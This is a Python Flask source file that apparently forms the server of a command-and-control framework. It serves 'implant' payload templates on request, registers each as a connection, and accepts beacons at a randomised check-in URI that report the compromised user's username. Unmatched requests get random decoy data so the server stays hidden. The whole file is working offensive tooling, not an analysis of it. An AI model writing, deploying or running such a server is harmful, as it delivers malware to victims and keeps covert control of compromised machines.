import os

from connect import color, connection, util
from flask import Flask, render_template, request

app = Flask(__name__)

checkin_uri = f'/{util.generate_id()}'

@app.route('/<format_id>', methods=['GET'])
def serve_implant(format_id):
    if format_id not in util.engine.IMPLANTS.keys():
        return render_template('connection_template.html', random_data=util.random_data)
    color.information('Implant requested')
    connection_id = util.generate_id()
    util.engine.connections[connection_id] = (connection.Connection(util.engine.IMPLANTS[format_id].format, connection_id))
    connection_id_expanded = (util.generate_str(), connection_id)
    return render_template(
        f'implants/{util.engine.connections[connection_id].implant_format}',
        checkin_uri=checkin_uri,
        connection_id=connection_id_expanded,
        variables=util.engine.IMPLANTS[format_id].variables,
        functions=util.engine.IMPLANTS[format_id].functions
    )

# URI Random -> Data in Post Request b/c it's encrypted.
@app.route(f'{checkin_uri}', methods=['POST'])
def checkin():
    post_data = request.get_json(force=True) #figure it out force=true
    post_data = dict(post_data)
    try:
        connection = util.engine.connections[post_data['connection_id']]
    except:
        return render_template('connection_template.html', random_data=util.random_data)
    color.success('Implant checkedin.')
    connection.system_information['username'] = post_data['username']
    connection.update_checkin()
    return render_template('connection_template.html', random_data=util.random_data)

def run():
     os.environ['WERKZEUG_RUN_MAIN'] = 'true'
     try:
        app.run(host=util.engine.ip, port=util.engine.port)
     except:
        color.information(f'Error starting server')
        return
     return
